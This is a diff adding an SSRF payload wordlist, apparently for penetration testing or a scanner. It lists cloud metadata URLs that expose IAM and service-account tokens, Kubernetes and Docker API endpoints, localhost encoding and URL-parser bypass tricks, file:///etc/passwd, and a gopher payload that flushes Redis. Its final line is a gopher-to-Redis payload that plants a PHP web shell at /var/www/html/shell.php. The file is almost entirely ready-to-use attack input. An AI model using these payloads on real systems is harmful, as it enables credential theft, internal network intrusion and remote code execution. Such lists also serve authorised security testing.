@@ -1,0 +1,115 @@
+# ============================================================================
+# SSRF - BYPASS PAYLOADS
+# ============================================================================
+# SSRF payloads to access internal services and cloud metadata
+# ============================================================================
+
+# AWS Metadata (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# AWS Metadata (IMDSv2 - Requires Token)
+# First get token, then use it
+# TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# GCP Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/project/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# DigitalOcean Metadata
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/id
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+
+# Kubernetes
+https://kubernetes.default.svc/
+https://kubernetes.default.svc/api/v1/namespaces
+https://kubernetes.default.svc/api/v1/pods
+
+# Docker
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2376/containers/json
+http://host.docker.internal/
+
+# Localhost Bypass Variations
+http://127.0.0.1/
+http://localhost/
+http://127.1/
+http://0.0.0.0/
+http://0/
+http://127.0.1/
+http://127.000.000.1/
+http://2130706433/  # Decimal IP for 127.0.0.1
+http://0x7f000001/  # Hex IP for 127.0.0.1
+http://0177.0.0.1/  # Octal
+http://[::1]/
+http://[0:0:0:0:0:0:0:1]/
+http://[0000::1]/
+http://①②⑦.⓿.⓿.①/
+http://127。0。0。1/
+http://127%E3%80%820%E3%80%820%E3%80%821/
+
+# Internal Services
+http://127.0.0.1:22/
+http://127.0.0.1:25/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://127.0.0.1:6379/
+http://127.0.0.1:8080/
+http://127.0.0.1:9200/
+http://127.0.0.1:27017/
+
+# Internal Network Ranges
+http://10.0.0.1/
+http://10.0.0.1:8080/
+http://172.16.0.1/
+http://172.17.0.1/  # Docker default
+http://192.168.0.1/
+http://192.168.1.1/
+
+# DNS Rebinding
+# Use services like rebinder.me or your own DNS server
+
+# URL Bypass Tricks
+http://127.0.0.1#@google.com/
+http://google.com@127.0.0.1/
+http://127.0.0.1%23@google.com/
+http://127.0.0.1%2523@google.com/
+http://127.0.0.1:80%40google.com/
+http://127.0.0.1:80%2540google.com/
+http://[::ffff:127.0.0.1]/
+http://localtest.me/  # Resolves to 127.0.0.1
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+
+# Enclosed Alphanumeric
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
+http://⒈⒉⒎.⒈/
+
+# Protocol Bypass
+file:///etc/passwd
+dict://127.0.0.1:6379/info
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+sftp://127.0.0.1/
+tftp://127.0.0.1/
+ldap://127.0.0.1/
+
+# Gopher Redis RCE
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0a%0a%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
